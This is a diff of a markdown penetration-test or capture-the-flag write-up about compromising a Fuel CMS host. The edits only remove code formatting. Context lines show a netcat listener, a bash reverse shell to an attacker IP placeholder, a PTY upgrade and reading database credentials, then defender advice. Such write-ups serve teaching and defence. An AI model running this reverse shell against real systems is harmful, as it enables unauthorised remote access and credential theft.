@@ -68,7 +68,7 @@ nc -lvnp 4444
 cmd: bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
 ```
 
-A standard PTY upgrade follows: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `export TERM=xterm`, and `Ctrl-Z; stty raw -echo; fg`.
+A standard PTY upgrade follows: python3 -c 'import pty; pty.spawn("/bin/bash")', export TERM=xterm, and Ctrl-Z; stty raw -echo; fg.
 
 **Step 7 - Read database.php.** The Fuel install guide on the landing page told me exactly where the database credentials live. Reading the config file from the www-data shell:
 
@@ -97,7 +97,7 @@ It works on the first try.
 
 ## What a Defender Should Do
 
-- Upgrade Fuel CMS or remove it. *create_function* was deprecated in PHP 7.2 and removed in PHP 8 for exactly this reason. Set `allow_url_include = Off` in php.ini globally.
+- Upgrade Fuel CMS or remove it. *create_function* was deprecated in PHP 7.2 and removed in PHP 8 for exactly this reason. Set allow_url_include = Off in php.ini globally.
 - Delete install/getting-started pages once setup is complete. Strip *Server* and *X-Powered-By* response headers, and never hardcode default credential text in production-facing templates.
 - Force a password change on first login for every administrative account. Refuse to start the application until the default credentials are rotated.
 - Move secrets out of the web root entirely. Read database credentials from environment variables loaded by systemd, from a real secrets manager (Vault, AWS Secrets Manager), or from a 0640-mode file outside any directory the web server serves.
